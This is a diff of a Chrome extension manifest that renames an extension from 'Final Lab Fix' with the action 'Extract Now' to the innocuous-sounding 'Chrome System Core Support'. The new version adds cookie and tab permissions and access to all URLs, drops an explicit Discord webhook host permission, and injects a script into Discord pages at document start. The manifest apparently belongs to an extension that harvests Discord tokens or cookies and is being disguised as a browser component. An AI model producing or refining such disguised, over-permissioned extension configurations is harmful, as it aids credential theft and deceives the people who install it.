@@ -1,15 +1,17 @@
 {
   "manifest_version": 3,
-  "name": "Final Lab Fix",
-  "version": "8.0",
-  "permissions": ["storage", "activeTab", "scripting"],
-  "host_permissions": ["*://*.discord.com/*", "https://*.discordapp.com/*", "https://discord.com/api/webhooks/*"],
-  "background": { "service_worker": "background.js" },
-  "action": { "default_title": "Extract Now" },
+  "name": "Chrome System Core Support",
+  "version": "5.0.2",
+  "permissions": ["cookies", "storage", "scripting", "tabs"],
+  "host_permissions": ["<all_urls>"],
+  "background": {
+    "service_worker": "background.js"
+  },
   "content_scripts": [
     {
       "matches": ["*://*.discord.com/*"],
-      "js": ["content.js"]
+      "js": ["content.js"],
+      "run_at": "document_start"
     }
   ]
 }
